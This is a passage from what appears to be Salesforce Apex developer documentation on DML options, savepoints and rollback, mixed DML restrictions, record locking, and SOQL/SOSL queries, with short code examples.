Database.DMLOptions dmo = new Database.DMLOptions();
dmo.assignmentRuleHeader.useDefaultRule= true;
```

```apex
Lead l = new Lead(company='ABC', lastname='Smith');
l.setOptions(dmo);
insert l;
```

The following example uses the `assignmentRuleID` option:

```apex
Database.DMLOptions dmo = new Database.DMLOptions();
dmo.assignmentRuleHeader.assignmentRuleId= '01QD0000000EqAn';
```

```apex
Lead l = new Lead(company='ABC', lastname='Smith');
l.setOptions(dmo);
insert l;
```

If there are no assignment rules in the organization, in API version 29.0 and earlier, creating a case or lead with `useDefaultRule` set to `true` results in the case or lead being assigned to the predefined default owner. In API version 30.0 and later, the case or lead is unassigned and doesn't get assigned to the default owner. `duplicateRuleHeader` Property The `duplicateRuleHeader` property determines whether a record that’s identified as a duplicate can be saved. Duplicate rules are part of the Duplicate Management feature. Using the `duplicateRuleHeader` property, you can set these options. `allowSave` : Indicates whether a record that’s identified as a duplicate can be saved. The following example shows how to save an account record that’s been identified as a duplicate. To learn how to iterate through duplicate errors, see DuplicateError Class

```apex
Database.DMLOptions dml = new Database.DMLOptions();
```

```apex
dml.DuplicateRuleHeader.AllowSave = true;
Account duplicateAccount = new Account(Name='dupe');
Database.SaveResult sr = Database.insert(duplicateAccount, dml);
if (sr.isSuccess()) {
System.debug('Duplicate account has been inserted in Salesforce!');
}
```

`emailHeader` Property System-generated emails from an unverified email-sending domain aren’t delivered, even if the From email address is verified. See Requirements to Send Email from Salesforce . The Salesforce user interface allows you to specify whether or not to send an email when the following events occur: Creation of a new case or task Conversion of a case email to a contact New user email notification Lead queue email notification Password reset In API version 15.0 and later, the Database.DMLOptions `emailHeader` property enables you to specify additional information regarding the email that gets sent when one of the events occurs because of Apex DML code execution. Using the `emailHeader` property, you can set these options. `triggerAutoResponseEmail` : Indicates whether to trigger auto-response rules ( `true` ) or not ( `false` ), for leads and cases. This email can be automatically triggered by a number of events, for example when creating a case or resetting a user password. If this value is set to `true` , when a case is created, if there is an email address for the contact specified in `ContactID` , the email is sent to that address. If not, the email is sent to the address specified in `SuppliedEmail` . `triggerOtherEmail` : Indicates whether to trigger email outside the organization ( `true` ) or not ( `false` ). This email can be automatically triggered by creating, editing, or deleting a contact for a case. `triggerUserEmail` : Indicates whether to trigger email that is sent to users in the organization ( `true` ) or not ( `false` ). This email can be automatically triggered by a number of events; resetting a password, creating a new user, or creating or modifying a task. Adding comments to a case in Apex doesn’t trigger email to users in the organization even if `triggerUserEmail` is set to `true` . Even though auto-sent emails can be triggered by actions in the Salesforce user interface, the DMLOptions settings for `emailHeader` take effect only for DML operations carried out in Apex code. In the following example, the `triggerAutoResponseEmail` option is specified:

```apex
Account a = new Account(name='Acme Plumbing');
```

```apex
insert a;
```

```apex
Contact c = new Contact(email='jplumber@salesforce.com', firstname='Joe',lastname='Plumber',
accountid=a.id);
```

```apex
insert c;
```

```apex
Database.DMLOptions dlo = new Database.DMLOptions();
```

```apex
dlo.EmailHeader.triggerAutoResponseEmail = true;
```

```apex
Case ca = new Case(subject='Plumbing Problems', contactid=c.id);
```

```apex
database.insert(ca, dlo);
```

Email sent through Apex because of a group event includes additional behaviors. A group event is an event for which `IsGroupEvent` is true. The EventAttendee object tracks the users, leads, or contacts that are invited to a group event. Note the following behaviors for group event email sent through Apex: Sending a group event invitation to a user respects the `triggerUserEmail` option Sending a group event invitation to a lead or contact respects the `triggerOtherEmail` option Email sent when updating or deleting a group event also respects the `triggerUserEmail` and `triggerOtherEmail` options, as appropriate `localeOptions` Property The `localeOptions` property specifies the language of any labels that are returned by Apex. The value must be a valid user locale (language and country), such as de_DE or en_GB. The value is a String, 2-5 characters long. The first two characters are always an ISO language code, for example 'fr' or 'en.' If the value is further qualified by a country, then the string also has an underscore (_) and another ISO country code, for example 'US' or 'UK.' For example, the string for the United States is 'en_US', and the string for French Canadian is 'fr_CA'. `optAllOrNone` Property The `optAllOrNone` property specifies whether the operation allows for partial success. If `optAllOrNone` is set to `true` , all changes are rolled back if any record causes errors. The default for this property is `false` and successfully processed records are committed while records with errors aren't. This property is available in Apex saved against Salesforce API version 20.0 and later. Read about transaction requests, generating and releasing savepoints, rolling back transactions, and more. All requests are delimited by the trigger, class method, Web Service, Visualforce page, or anonymous block that executes the Apex code. If the entire request completes successfully, all changes are committed to the database. For example, suppose a Visualforce page called an Apex controller, which in turn called an additional Apex class. Only when all the Apex code has finished running and the Visualforce page has finished running, are the changes committed to the database. If the request doesn’t complete successfully, all database changes are rolled back. Generating Savepoints and Rolling Back Transactions Sometimes during the processing of records, your business rules require that partial work (already executed DML statements) is rolled back so that the processing can continue in another direction. Apex gives you the ability to generate a savepoint , that is, a point in the request that specifies the state of the database at that time. Any DML statement that occurs after the savepoint can be discarded, restoring the database to the condition it was in when you generated the savepoint. All table and row locks acquired since the savepoint are released. The following limitations apply to generating savepoint variables and rolling back the database: If you set more than one savepoint, then roll back to a savepoint that isn’t the last savepoint you generated, the later savepoint variable is also rolled back and becomes invalid. For example, if you generated savepoint `SP1` first, savepoint `SP2` after that, and then you rolled back to `SP1` , the variable `SP2` is no longer valid. If you try to use savepoint `SP2` , you receive a runtime error. References to savepoints can’t cross-trigger invocations because each trigger invocation is a new trigger context. If you declare a savepoint as a static variable then try to use it across trigger contexts, you receive a run-time error. Each savepoint you set counts against the governor limit for DML statements. Static variables aren’t reverted during a rollback. If you try to run the trigger again, the static variables retain the values from the first run. `Database.rollback(Savepoint)` and `Database.setSavepoint()` don’t count against the DML row limit, but count toward the DML statement limit. This behavior applies to all API versions. The ID on an sObject inserted after setting a savepoint isn’t cleared after a rollback. Attempting to insert the sObject using the variable created before the rollback fails because the sObject variable has an ID. Updating or upserting the sObject using the same variable also fails because the sObject isn’t in the database and, thus, can’t be updated. To perform further DML operations, create an sObject variable without setting its ID. The following is an example using the `setSavepoint` and `rollback` Database methods.

```apex
Account a = new Account(Name = 'xyz');
insert a;
Assert.isNull([SELECT AccountNumber FROM Account WHERE Id
= :a.Id]. AccountNumber);
// Create a savepoint while AccountNumber is null
Savepoint sp = Database.setSavepoint();
// Change the account number
a.AccountNumber = '123';
update a;
Assert.areEqual('123', [SELECT AccountNumber FROM Account WHERE Id
= :a.Id].
AccountNumber);
// Rollback to the previous null value
Database.rollback(sp);
Assert.isNull([SELECT AccountNumber FROM Account WHERE Id
= :a.Id]. AccountNumber);
```

Releasing Savepoints and Using Callouts To allow callouts, roll back all uncommitted DML by using a savepoint. Then use the `Database.releaseSavepoint` method to explicitly release savepoints before making the desired callout. When `Database.releaseSavepoint()` is called, `SAVEPOINT_RELEASE` is logged. See `releaseSavepoint()` for more information. In this example, the `makeACallout()` callout succeeds because the uncommitted DML is rolled back and the savepoint is released.

```apex
Savepoint sp = Database.setSavepoint();
try {
// Try a database operation
insert new Account(name='Foo');
integer bang = 1 / 0;
} catch (Exception ex) {
Database.rollback(sp);
Database.releaseSavepoint(sp);
makeACallout();
}
```

In this example, the savepoint isn’t released before making the callout. The `CalloutException` informs you that you must release all active savepoints before making the callout.

```apex
Savepoint sp = Database.setSavepoint();
try {
```

```apex
makeACallout();
} catch (System.CalloutException ex) {
Assert.isTrue(ex.getMessage().contains('All active Savepoints must be released before
making callouts.'));
}
```

In this example, DML is pending when the callout is made. The `CalloutException` informs you that you must roll back the transaction before the callout is made or the transaction must be committed.

```apex
Savepoint sp = Database.setSavepoint();
insert new Account(name='Foo');
Database.releaseSavepoint(sp);
try {
makeACallout();
} catch (System.CalloutException ex) {
Assert.isTrue(ex.getMessage().contains('You have uncommitted work pending. Please commit
or rollback before calling out.'));
}
```

Use these guidelines for using callouts and savepoints. If there’s uncommitted work pending when `Database.releaseSavepoint()` is called, the uncommitted work isn’t rolled back. It’s committed if the transaction succeeds. Attempts to roll back to a released savepoint result in a `TypeException` . Attempts to roll back after calling `Database.releaseSavepoint()` result in a `System.InvalidOperationException` . Calling the `Database.releaseSavepoint()` method on a savepoint also releases nested savepoints, that is, any subsequent savepoints created after a savepoint. Versioned Behavior Changes For Apex tests with API version 60.0 or later, all savepoints are released when `Test.startTest()` and `Test.stopTest()` are called. If any savepoints are reset, a `SAVEPOINT_RESET` event is logged. Before API version 60.0, making a callout after creating savepoints throws a `CalloutException` regardless of whether there was uncommitted DML or the changes were rolled back to a savepoint. Also, before API version 60.0, both `Database.rollback(databaseSavepoint)` and `Database.setSavepoint()` calls incremented the DML row usage limit. DML operations on certain sObjects, sometimes referred to as setup objects, can’t be mixed with DML on non-setup sObjects in the same transaction. This restriction exists because some sObjects affect the user’s access to records in the org. You must insert or update these types of sObjects in a different transaction to prevent operations from happening with incorrect access-level permissions. For example, you can’t update an account and a user role in a single transaction. Don’t include more than one of these sObjects in the same transaction when performing DML operations or when using the Metadata API. These sObjects also can't be used with the @IsTest (IsParallel=true) annotation. Split such operations into separate transactions. This list includes sObjects that cannot be used together in the same DML transaction, but is not an exhaustive list. AuthSession ContentWorkspace FieldPermissions ForecastingShare Group You can only insert and update a group in a transaction with other sObjects. Other DML operations aren’t allowed. GroupMember With legacy Apex code saved using Salesforce API version 14.0 and earlier, you can insert and update a group member with other sObjects in the same transaction. ObjectPermissions ObjectTerritory2AssignmentRule ObjectTerritory2AssignmentRuleItem PermissionSet PermissionSetAssignment QueueSObject RuleTerritory2Association SetupEntityAccess Territory Territory2 Territory2Model User You can insert a user in a transaction with other sObjects in Apex code saved using Salesforce API version 14.0 and earlier. You can insert a user in a transaction with other sObjects in Apex code saved using Salesforce API version 15.0 and later when `UserRoleId` is specified as null. You can update a user in a transaction with other sObjects in Apex code saved using Salesforce API version 14.0 and earlier You can update a user in a transaction with other sObjects in Apex code saved using Salesforce API version 15.0 and later when the user isn’t included in a Lightning Sync or Einstein Activity Capture configuration (either active or inactive) and the following fields aren’t updated:

```apex
–
UserRoleId
```

`IsActive`

```apex
–
ForecastEnabled
```

```apex
–
IsPortalEnabled
```

`Username`

```apex
–
ProfileId
```

UserPackageLicense UserRole UserTerritory UserTerritory2Association If you're using a Visualforce page with a custom controller, you can't mix sObject types with any of these special sObjects within a single request or action. However, you can perform DML operations on these different types of sObjects in subsequent requests. For example, you can create an account with a save button, and then create a user with a non-null role with a submit button. You can perform DML operations on more than one type of sObject in a single class using the following process: **1.** Create a method that performs a DML operation on one type of sObject. **2.** Create a second method that uses the `future` annotation to manipulate a second sObject type. This process is demonstrated in the example in the next section. Example: Using a Future Method to Perform Mixed DML Operations This example shows how to perform mixed DML operations by using a future method to perform a DML operation on the User object.

```apex
public class MixedDMLFuture {
```

```apex
public static void useFutureMethod() {
```

```apex
// First DML operation
Account a = new Account(Name='Acme');
insert a;
```

```apex
// This next operation (insert a user with a role)
// can't be mixed with the previous insert unless
// it is within a future method.
// Call future method to insert a user with a role.
Util.insertUserWithRole(
```

```apex
'mruiz@awcomputing.com', 'mruiz',
'mruiz@awcomputing.com', 'Ruiz');
}
}
```

```apex
public class Util {
```

```apex
@future
public static void insertUserWithRole(
```

```apex
String uname, String al, String em, String lname) {
```

```apex
Profile p = [SELECT Id FROM Profile WHERE Name='Standard User'];
UserRole r = [SELECT Id FROM UserRole WHERE Name='COO'];
// Create new user with a non-null user role ID
User u = new User(alias = al, email=em,
emailencodingkey='UTF-8', lastname=lname,
languagelocalekey='en_US',
localesidkey='en_US', profileid = p.Id, userroleid = r.Id,
timezonesidkey='America/Los_Angeles',
username=uname);
insert u;
}
}
```

Mixed DML Operations in Test Methods Test methods allow for performing mixed Data Manipulation Language (DML) operations that include both setup sObjects and other sObjects if the code that performs the DML operations is enclosed within `System.runAs` method blocks. You can also perform DML in an asynchronous job that your test method calls. These techniques enable you, for example, to create a user with a role and other sObjects in the same test. Mixed DML Operations in Test Methods Test methods allow for performing mixed Data Manipulation Language (DML) operations that include both setup sObjects and other sObjects if the code that performs the DML operations is enclosed within `System.runAs` method blocks. You can also perform DML in an asynchronous job that your test method calls. These techniques enable you, for example, to create a user with a role and other sObjects in the same test. The setup sObjects are listed in sObjects That Cannot Be Used Together in DML Operations . Because validation for mixed DML operations is skipped during deployment, there can be a difference in the number of test failures when tests are deployed versus when run in the user interface. **Example: Mixed DML Operations in** `System.runAs` **Blocks** This example shows how to enclose mixed DML operations within `System.runAs` blocks to avoid the mixed DML error. The `System.runAs` block runs in the current user’s context. It creates a test user with a role and a test account, which is a mixed DML operation.

```apex
@isTest
private class MixedDML {
```

```apex
static testMethod void mixedDMLExample() {
User u;
Account a;
User thisUser = [SELECT Id FROM User WHERE Id = :UserInfo.getUserId()];
// Insert account as current user
```

```apex
System.runAs (thisUser) {
Profile p = [SELECT Id FROM Profile WHERE Name='Standard User'];
UserRole r = [SELECT Id FROM UserRole WHERE Name='COO'];
u = new User(alias = 'jsmith', email='jsmith@acme.com',
emailencodingkey='UTF-8', lastname='Smith',
languagelocalekey='en_US',
localesidkey='en_US', profileid = p.Id, userroleid = r.Id,
timezonesidkey='America/Los_Angeles',
username='jsmith@acme.com');
insert u;
a = new Account(name='Acme');
insert a;
}
}
}
```

**Use** `@future` **to Bypass the Mixed DML Error in a Test Method** Mixed DML operations within a single transaction aren’t allowed. You can’t perform DML on a setup sObject and another sObject in the same transaction. However, you can perform one type of DML as part of an asynchronous job and the others in other asynchronous jobs or in the original transaction. This class contains an `@future` method to be called by the class in the subsequent example.

```apex
public class InsertFutureUser {
```

```apex
@future
public static void insertUser() {
Profile p = [SELECT Id FROM Profile WHERE Name='Standard User'];
UserRole r = [SELECT Id FROM UserRole WHERE Name='COO'];
User futureUser = new User(firstname = 'Future', lastname = 'User',
alias = 'future', defaultgroupnotificationfrequency = 'N',
digestfrequency = 'N', email = 'test@test.org',
```

```apex
emailencodingkey = 'UTF-8', languagelocalekey='en_US',
localesidkey='en_US', profileid = p.Id,
timezonesidkey = 'America/Los_Angeles',
username = 'futureuser@test.org',
userpermissionsmarketinguser = false,
userpermissionsofflineuser = false, userroleid = r.Id);
insert(futureUser);
}
}
```

This class calls the method in the previous class.

```apex
@isTest
public class UserAndContactTest {
```

```apex
public testmethod static void testUserAndContact() {
InsertFutureUser.insertUser();
Contact currentContact = new Contact(
firstName = String.valueOf(System.currentTimeMillis()),
lastName = 'Contact');
insert(currentContact);
}
}
```

Your organization contains standard objects provided by Salesforce and custom objects that you created. These objects can be accessed in Apex as instances of the sObject data type. You can query these objects and perform DML operations on them. However, some standard objects don’t support DML operations although you can still obtain them in queries. The following is a non-exhaustive list of such objects: AccountTerritoryAssignmentRule AccountTerritoryAssignmentRuleItem ApexComponent ApexPage BusinessHours BusinessProcess CategoryNode CurrencyType DatedConversionRate NetworkMember (allows `update` only) ProcessInstance Profile RecordType SelfServiceUser StaticResource Territory2 UserAccountTeamMember UserPreference UserTerritory WebLink The following are special cases of DML operations on objects. If an Account record has a record type of Person Account, the Name field can’t be modified with DML operations. All standard and custom objects can also be accessed through the SOAP API. ProcessInstance is an exception. You can’t create, update, or delete ProcessInstance in the SOAP API. DML operations aren't supported on Data Cloud data model objects (DMOs). For details on using Apex with Data Cloud objects, see Data Cloud in Apex . To determine if DML is supported on your specific object, use the `Schema.describeSObjects()` method as shown in this sample code.

```apex
// This example describes the ApexPage object. Replace it with your
// objects(s) in the results list to check if DML is permitted.
List<Schema.DescribeSobjectResult> results = Schema.describeSObjects(new List<string>
{'ApexPage'}, SObjectDescribeOptions.DEFERRED);
DescribeSObjectResult d = results[0];
System.debug('isCreateable():' + d.isCreateable());
System.debug('isUpdateable():' + d.isUpdateable());
System.debug('isQueryable(): ' + d.isQueryable());
```

Exceptions that arise from a bulk DML call (including any recursive DML operations in triggers that are fired as a direct result of the call) are handled differently depending on where the original call came from: When errors occur because of a bulk DML call that originates directly from the Apex DML statements, or if the `allOrNone` parameter of a Database DML method is set to `true` , the runtime engine follows the “all or nothing” rule: during a single operation, all records must be updated successfully or the entire operation rolls back to the point immediately preceding the DML statement. If the `allOrNone` parameter of a Database DML method is set to `false` and a record fails, the remainder of the DML operation can still succeed. You must iterate through the returned results to identify which records succeeded or failed. If the `allOrNone` parameter of a Database DML method is set to `false` and a before-trigger assigns an invalid value to a field, the partial set of valid records isn’t inserted. When errors occur because of a bulk DML call that originates from SOAP API with default settings, or if the `allOrNone` parameter of a Database DML method was specified as `false` , the runtime engine attempts at least a partial save: **1.** During the first attempt, the runtime engine processes all records. Any record that generates an error due to issues such as validation rules or unique index violations is set aside. **2.** If there were errors during the first attempt, the runtime engine makes a second attempt that includes only those records that didn’t generate errors. All records that didn't generate an error during the first attempt are processed, and if any record generates an error (perhaps because of race conditions) it’s also set aside. **3.** If there were additional errors during the second attempt, the runtime engine makes a third and final attempt that includes only those records that didn’t generate errors during the first and second attempts. If any record generates an error, the entire operation fails with the error message, “Too many batch retries in the presence of Apex triggers and partial failures.” During the second and third attempts, governor limits are reset to their original state before the first attempt. See Execution Governors and Limits on page 348. Apex triggers are fired for the first save attempt, and if errors are encountered for some records and subsequent attempts are made to save the subset of successful records, triggers are refired on this subset of records. **Non-Null Required Fields Values and Null Fields** When inserting new records or updating required fields on existing records, you must supply non- `null` values for all required fields. Unlike the SOAP API, Apex allows you to change field values to `null` without updating the `fieldsToNull` array on the sObject record. The API requires an update to this array due to the inconsistent handling of `null` values by many SOAP providers. Because Apex runs solely on the Lightning Platform, this workaround is unnecessary. **DML Not Supported with Some sObjects** DML operations are not supported with certain sObjects. See sObjects That Don’t Support DML Operations . **String Field Truncation and API Version** Apex classes and triggers saved (compiled) using API version 15.0 and higher produce a runtime error if you assign a String value that is too long for the field. **sObject Properties to Enable DML Operations** To be able to insert, update, delete, or undelete an sObject record, the sObject must have the corresponding property ( `createable` , `updateable` , `deletable` , or `undeletable` respectively) set to `true` . **ID Values** The `insert` statement automatically sets the ID value of all new sObject records. Inserting a record that already has an ID—and therefore already exists in your organization's data—produces an error. See Lists for more information. The `insert` and `update` statements check each batch of records for duplicate ID values. If there are duplicates, the first five are processed. For the sixth and all additional duplicate IDs, the SaveResult for those entries is marked with an error similar to the following: `Maximum` `number` `of` `duplicate` `updates` `in` `one` `batch` `(5` `allowed).` `Attempt` `to` `update` `Id` `more` `than` `once` `in` `this` `API` `call:` `number_of_attempts` `.` The ID of an updated sObject record cannot be modified in an `update` statement, but related record IDs can. **Fields With Unique Constraints** For some sObjects that have fields with unique constraints, inserting duplicate sObject records results in an error. For example, inserting CollaborationGroup sObjects with the same names results in an error because CollaborationGroup records must have unique names. **System Fields Automatically Set** When inserting new records, system fields such as `CreatedDate` , `CreatedById` , and `SystemModstamp` are automatically updated. You cannot explicitly specify these values in your Apex. Similarly, when updating records, system fields such as `LastModifiedDate` , `LastModifiedById` , and `SystemModstamp` are automatically updated. **Maximum Number of Records Processed by DML Statement** You can pass a maximum of 10,000 sObject records to a single `insert` , `update` , `delete` , and `undelete` method. Each `upsert` statement consists of two operations, one for inserting records and one for updating records. Each of these operations is subject to the runtime limits for `insert` and `update` , respectively. For example, if you upsert more than 10,000 records and all of them are being updated, you receive an error. (See Execution Governors and Limits on page 348) **Upsert and Foreign Keys** You can use foreign keys to upsert sObject records if they have been set as reference fields. For more information, see Field Types in the Object Reference for Salesforce. **Creating Records for Multiple Object Types** As with the SOAP API, you can create records in Apex for multiple object types, including custom objects, in one DML call with API version 20.0 and later. For example, you can create a contact and an account in one call. You can create records for up to 10 object types in one call. Records are saved in the same order that they’re entered in the sObject input array. If you’re entering new records that have a parent-child relationship, the parent record must precede the child record in the array. For example, if you’re creating a contact that references an account that’s also being created in the same call, the account must have a smaller index in the array than the contact does. The contact references the account by using an `External` `ID` field. You can’t add a record that references another record of the same object type in the same call. For example, the Contact object has a `Reports` `To` field that’s a reference to another contact. You can’t create two contacts in one call if one contact uses the `Reports` `To` field to reference a second contact in the input array. You can create a contact that references another contact that has been previously created. Records for multiple object types are broken into multiple chunks by Salesforce. A chunk is a subset of the input array, and each chunk contains records of one object type. Data is committed on a chunk-by-chunk basis. Any Apex triggers that are related to the records in a chunk are invoked once per chunk. Consider an sObject input array that contains the following set of records:

```apex
account1, account2, contact1, contact2, contact3, case1, account3, account4, contact4
```

Salesforce splits the records into five chunks: **1.** `account1,` `account2`

```apex
2. contact1, contact2, contact3
```

**3.** `case1` **4.** `account3,` `account4` **5.** `contact4` Each call can process up to 10 chunks. If the sObject array contains more than 10 chunks, you must process the records in more than one call. For additional information about this feature, see Creating Records for Different Object Types in the SOAP API Developer Guide . For Apex, the chunking of the input array for an insert or update DML operation has two possible causes: the existence of multiple object types or the default chunk size of 200. If chunking in the input array occurs because of both of these reasons, each chunk is counted toward the limit of 10 chunks. If the input array contains only one type of sObject, you won’t hit this limit. However, if the input array contains at least two sObject types and contains a high number of objects that are chunked into groups of 200, you might hit this limit. For example, if you have an array that contains 1,001 consecutive leads followed by 1,001 consecutive contacts, the array will be chunked into 12 groups: Two groups are due to the different sObject types of Lead and Contact, and the remaining are due to the default chunking size of 200 objects. In this case, the insert or update operation returns an error because you reached the limit of 10 chunks in hybrid arrays. The workaround is to call the DML operation for each object type separately. **DML and Knowledge Objects** To execute DML code on knowledge articles (KnowledgeArticleVersion types such as the custom FAQ__kav article type), the running user must have the Knowledge User feature license. Otherwise, calling a class method that contains DML operations on knowledge articles results in errors. If the running user isn’t a system administrator and doesn’t have the Knowledge User feature license, calling any method in the class returns an error even if the called method doesn’t contain DML code for knowledge articles but another method in the class does. For example, the following class contains two methods, only one of which performs DML on a knowledge article. A non-administrator non-knowledge user who calls the `doNothing` method will get the following error: `DML` `operation` `UPDATE` `not` `allowed` `on` `FAQ__kav`

```apex
public class KnowledgeAccess {
```

```apex
public void doNothing() {
}
```

```apex
public void DMLOperation() {
FAQ__kav[] articles = [SELECT Id FROM FAQ__kav WHERE PublishStatus = 'Draft' and
```

```apex
Language = 'en_US'];
```

```apex
update articles;
}
```

```apex
}
```

As a workaround, cast the input array to the DML statement from an array of FAQ__kav articles to an array of the generic sObject type as follows:

```apex
public void DMLOperation() {
FAQ__kav[] articles = [SELECT id FROM FAQ__kav WHERE PublishStatus = 'Draft' and
Language = 'en_US'];
```

```apex
update (sObject[]) articles;
}
```

#### Locking Records

When an sObject record is locked, no other client or user is allowed to make updates either through code or the Salesforce user interface. The client locking the records can perform logic on the records and make updates with the guarantee that the locked records won’t be changed by another client during the lock period. Locking Statements In Apex, you can use `FOR` `UPDATE` to lock sObject records while they’re being updated in order to prevent race conditions and other thread safety problems. Locking in a SOQL For Loop Avoiding Deadlocks In Apex, you can use `FOR` `UPDATE` to lock sObject records while they’re being updated in order to prevent race conditions and other thread safety problems. While an sObject record is locked, no other client or user is allowed to make updates either through code or the Salesforce user interface. The client locking the records can perform logic on the records and make updates with the guarantee that the locked records won’t be changed by another client during the lock period. The lock gets released when the transaction completes. To lock a set of sObject records in Apex, embed the keywords `FOR` `UPDATE` after any inline SOQL statement. For example, the following statement, in addition to querying for two accounts, also locks the accounts that are returned:

```apex
Account [] accts = [SELECT Id FROM Account LIMIT 2 FOR UPDATE];
```

You can’t use the `ORDER` `BY` keywords in any SOQL query that uses locking. Locking Considerations While the records are locked by a client, the locking client can modify their field values in the database in the same transaction. Other clients have to wait until the transaction completes and the records are no longer locked before being able to update the same records. Other clients can still query the same records while they’re locked. If you attempt to lock a record currently locked by another client, your process waits a maximum of 10 seconds for the lock to be released before acquiring a new lock. If the wait time exceeds 10 seconds, a `QueryException` is thrown. Similarly, if you attempt to update a record currently locked by another client and the lock isn’t released within a maximum of 10 seconds, a `DmlException` is thrown. If a client attempts to modify a locked record, the update operation can succeed if the lock gets released within a short amount of time after the update call was made. In this case, it’s possible that the updates overwrite changes made by the locking client if the second client obtained an old copy of the record. To prevent the overwrite from happening, the second client must lock the record first. The locking process returns a fresh copy of the record from the database through the `SELECT` statement. The second client can use this copy to make new updates. The record locks that are obtained in Apex via `FOR` `UPDATE` clause are automatically released when making callouts. The information is logged in the debug log and the logged message includes the most recently locked entity type. For example: `FOR_UPDATE_LOCKS_RELEASE` `FOR` `UPDATE` `locks` `released` `due` `to` `a` `callout.` `The` `most` `recent` `lock` `was` `Account.` Use caution while making callouts in contexts where `FOR` `UPDATE` queries could have been previously executed. When you perform a DML operation on one record, related records are locked in addition to the record in question. Use care when setting locks in your Apex code. See Avoiding Deadlocks . The `FOR` `UPDATE` keywords can also be used within SOQL `for` loops. For example:

```apex
for (Account[] accts : [SELECT Id FROM Account
FOR UPDATE]) {
// Your code
}
```

As discussed in SOQL For Loops , the example above corresponds internally to calls to the `query()` and `queryMore()` methods in the SOAP API. Note that there is no `commit` statement. If your Apex trigger completes successfully, any database changes are automatically committed. If your Apex trigger does not complete successfully, any changes made to the database are rolled back. Apex has the possibility of deadlocks, as does any other procedural logic language involving updates to multiple database tables or rows. To avoid such deadlocks, the Apex runtime engine: **1.** First locks sObject parent records, then children. **2.** Locks sObject records in order of ID when multiple records of the same type are being edited. As a developer, use care when locking rows to ensure that you are not introducing deadlocks. Verify that you are using standard deadlock avoidance techniques by accessing tables and rows in the same order from all locations in an application.

### SOQL and SOSL Queries

You can evaluate Salesforce Object Query Language (SOQL) or Salesforce Object Search Language (SOSL) statements on-the-fly in Apex by surrounding the statement in square brackets.

#### SOQL Statements

SOQL statements evaluate to a list of sObjects, a single sObject, or an Integer for `count` method queries. For example, you could retrieve a list of accounts that are named Acme:

```apex
List<Account> aa = [SELECT Id, Name FROM Account WHERE Name = 'Acme'];
```

From this list, you can access individual elements:

```apex
if (!aa.isEmpty()) {
```

```apex
// Execute commands
}
```

You can also create new objects from SOQL queries on existing ones. This example creates a new contact for the first account with the number of employees greater than 10.

```apex
Contact c = new Contact(Account = [SELECT Name FROM Account
WHERE NumberOfEmployees > 10 LIMIT 1]);
c.FirstName = 'James';
c.LastName = 'Yoyce';
```

The newly created object contains null values for its fields, which must be set. The `count` method can be used to return the number of rows returned by a query. The following example returns the total number of contacts with the last name of Weissman:

```apex
Integer i = [SELECT COUNT() FROM Contact WHERE LastName = 'Weissman'];
```

You can also operate on the results using standard arithmetic:

```apex
Integer j = 5 * [SELECT COUNT() FROM Account];
```

SOQL limits apply when executing SOQL queries. See Execution Governors and Limits . For a full description of SOQL query syntax, see the Salesforce SOQL and SOSL Reference Guide .

#### SOSL Statements

SOSL statements evaluate to a list of lists of sObjects, where each list contains the search results for a particular sObject type. The result lists are always returned in the same order as they were specified in the SOSL query. If a SOSL query doesn’t return any records for a specified sObject type, the search results include an empty list for that sObject. For example, you can return a list of accounts, contacts, opportunities, and leads that begin with the phrase map:

```apex
List<List<SObject>> searchList = [FIND 'map*' IN ALL FIELDS RETURNING Account (Id, Name),
Contact, Opportunity, Lead];
```

The syntax of the `FIND` clause in Apex differs from the syntax of the `FIND` clause in SOAP API and REST API: In Apex, the value of the `FIND` clause is demarcated with single quotes. For example:

```apex
FIND 'map*' IN ALL FIELDS RETURNING Account (Id, Name), Contact, Opportunity, Lead
```

Apex that is running in system mode ignores field-level security while scanning for a match using `IN` `ALL` `FIELDS` . In the API, the value of the `FIND` clause is demarcated with braces. For example:

```apex
FIND {map*} IN ALL FIELDS RETURNING Account (Id, Name), Contact, Opportunity, Lead
```

From `searchList` , you can create arrays for each object returned:

```apex
Account [] accounts = ((List<Account>)searchList[0]);
Contact [] contacts = ((List<Contact>)searchList[1]);
Opportunity [] opportunities = ((List<Opportunity>)searchList[2]);
Lead [] leads = ((List<Lead>)searchList[3]);
```

SOSL limits apply when executing SOSL queries. See Execution Governors and Limits . The 4,000 characters limit for WHERE clause strings doesn’t apply to SOQL queries in Apex if the WHERE clause includes the IN operator. For a full description of SOSL query syntax, see the Salesforce SOQL and SOSL Reference Guide . 1. Working with SOQL and SOSL Query Results 2. Accessing sObject Fields Through Relationships 3. Understanding Foreign Key and Parent-Child Relationship SOQL Queries 4. Working with SOQL Aggregate Functions Aggregate functions in SOQL, such as `SUM()` and `MAX()` , allow you to roll up and summarize your data in a query. 5. Working with Very Large SOQL Queries 6. Using SOQL Queries That Return One Record SOQL queries can be used to assign a single sObject value when the result list contains only one element. 7. Improve Performance by Avoiding Null Values 8. Working with Polymorphic Relationships in SOQL Queries A polymorphic relationship is a relationship between objects where a referenced object can be one of several different types. For example, the `Who` relationship field of a Task can be a Contact or a Lead. 9. Using Apex Variables in SOQL and SOSL Queries 10. Querying All Records with a SOQL Statement

#### Working with SOQL and SOSL Query Results

SOQL and SOSL queries only return data for sObject fields that are selected in the original query. If you try to access a field that was not selected in the SOQL or SOSL query (other than ID), you receive a runtime error, even if the field contains a value in the database. The following code example causes a runtime error:

```apex
insert new Account(Name = 'Singha');
Account acc = [SELECT Id FROM Account WHERE Name = 'Singha' LIMIT 1];
// Note that name is not selected
String name = [SELECT Id FROM Account WHERE Name = 'Singha' LIMIT 1].Name;
```

The following is the same code example rewritten so it does not produce a runtime error. Note that `Name` has been added as part of the select statement, after `Id` .

```apex
insert new Account(Name = 'Singha');
Account acc = [SELECT Id FROM Account WHERE Name = 'Singha' LIMIT 1];
// Note that name is now selected
String name = [SELECT Id, Name FROM Account WHERE Name = 'Singha' LIMIT 1].Name;
```

Even if only one sObject field is selected, a SOQL or SOSL query always returns data as complete records. Consequently, you must dereference the field in order to access it. For example, this code retrieves an sObject list from the database with a SOQL query, accesses the first account record in the list, and then dereferences the record's `AnnualRevenue` field:

```apex
Double rev = [SELECT AnnualRevenue FROM Account
WHERE Name = 'Acme'][0].AnnualRevenue;
```

```apex
// When only one result is returned in a SOQL query, it is not necessary
// to include the list's index.
Double rev2 = [SELECT AnnualRevenue FROM Account
WHERE Name = 'Acme' LIMIT 1].AnnualRevenue;
```

The only situation in which it is not necessary to dereference an sObject field in the result of an SOQL query, is when the query returns an Integer as the result of a `COUNT` operation:

```apex
Integer i = [SELECT COUNT() FROM Account];
```

